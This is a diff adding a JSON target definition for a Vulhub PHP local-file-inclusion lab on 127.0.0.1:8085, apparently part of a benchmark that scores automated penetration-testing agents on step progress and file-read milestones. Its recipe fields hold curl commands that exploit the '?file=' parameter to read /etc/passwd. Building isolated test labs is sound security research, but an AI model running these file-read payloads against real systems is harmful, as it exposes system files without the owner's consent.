@@ -1,0 +1,17 @@
+{
+  "name": "Vulhub-PHP-Inclusion-LFI",
+  "kind": "single-web-app-container",
+  "target": "http://127.0.0.1:8085",
+  "abstract_family": "leak_file",
+  "isolation_note": "Vulhub php/inclusion (LFI, php 7.1.3 apache), bound to 127.0.0.1:8085 only. Owned, disposable local lab.",
+  "eta_fill": {"login": "/", "wordlist": "/usr/share/wordlists/dirb/common.txt", "webshell": "/", "file": "/etc/passwd"},
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"{target}/\"",
+    "content_retrieval": "curl -s \"{target}/lfi.php?file=/etc/passwd\"",
+    "vulnerability_check": "curl -s \"{target}/lfi.php?file=/etc/passwd\"",
+    "exploit_attempt": "curl -s \"{target}/lfi.php?file=/etc/passwd\"",
+    "sensitive_file_read": "curl -s \"{target}/lfi.php?file=/etc/passwd\""
+  },
+  "recommended_first": false,
+  "rationale": "PHP local file inclusion (?file=). FILE-READ-ONLY box (no command execution) — so the full goal (cmd-exec + file-read) is NOT reachable; it is a valid data point for the per-step-progress + file-read MILESTONE metrics (7-dim suite), demonstrating the metrics work where binary success cannot. Param name to be empirically confirmed."
+}
